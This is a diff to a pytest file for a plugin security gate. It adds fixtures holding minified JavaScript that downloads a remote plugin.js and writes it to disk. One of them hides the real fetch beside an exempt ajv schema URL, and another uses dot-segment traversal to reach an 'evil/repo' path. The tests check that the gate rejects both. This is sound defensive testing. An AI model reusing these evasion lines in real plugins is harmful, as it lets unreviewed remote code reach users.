@@ -175,6 +175,25 @@ def _log_forging_filename(tp, origin, sha):
     return _entry(tp, "evil.yaml", _commit(origin)), "self-updating code"
 
 
+AJV_DATA_ID = "https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"
+
+
+def _self_updater_beside_ajv_id(tp, origin, sha):
+    # One minified line: the exempt ajv id must not hide the real fetch after it.
+    (origin / "plugin" / "cli.js").write_text(
+        f'$id:"{AJV_DATA_ID}";fetch("https://raw.githubusercontent.com/o/r/main/plugin.js");'
+        "fs.writeFileSync(p,b)", encoding="utf-8")
+    return _entry(tp, "evil.yaml", _commit(origin)), "self-updating code"
+
+
+def _self_updater_through_ajv_refs(tp, origin, sha):
+    # URL parsing resolves the dot segments to raw.githubusercontent.com/evil/repo/...
+    (origin / "plugin" / "cli.js").write_text(
+        'fetch("https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json/'
+        '../../../../../../evil/repo/main/plugin.js");fs.writeFileSync(p,b)', encoding="utf-8")
+    return _entry(tp, "evil.yaml", _commit(origin)), "self-updating code"
+
+
 def _shadowed_parser_import(tp, origin, sha):
     # cwd is the PR checkout; without `python3 -I` this shlex.py shadows the
     # stdlib (first imported by the parser itself) and swallows the verdict.
@@ -191,6 +210,7 @@ def _shadowed_parser_import(tp, origin, sha):
     _newline_sha, _log_forging_repo, _symlinked_entry_file, _self_updater_in_spaced_dir,
     _bundled_native_binary, _committed_bytecode,
     _log_forging_filename, _shadowed_parser_import,
+    _self_updater_beside_ajv_id, _self_updater_through_ajv_refs,
 ], ids=lambda f: f.__name__.lstrip("_"))
 def test_bypass_fails_the_gate(tmp_path, origin, case):
     sha = _git(origin, "rev-parse", "HEAD")
@@ -225,6 +245,18 @@ def test_one_entry_cannot_skip_or_impersonate_the_others(tmp_path, origin):
     assert f"PASS: {ok}" in res.stdout
     assert f"PASS: {ok2}" in res.stdout
     assert f"PASS: {crash}" not in res.stdout
+
+
+def test_bundled_ajv_meta_schema_id_is_not_a_fetch(tmp_path, origin):
+    """ajv resolves its $data meta-schema from memory; a bundle carrying that
+    id alongside its own data-file writes is not a self-updater."""
+    (origin / "plugin" / "cli.js").write_text(
+        f'var s={{$id:"{AJV_DATA_ID}"}};\nvar r={{$ref:"{AJV_DATA_ID}"}};\n'
+        "fs.writeFileSync(p,b)", encoding="utf-8")
+    entry = _entry(tmp_path, "ok.yaml", _commit(origin))
+    res = _gate(tmp_path, origin, [entry])
+    assert res.returncode == 0, res.stdout + res.stderr
+    assert f"PASS: {entry}" in res.stdout
 
 
 @pytest.mark.parametrize("fields", [
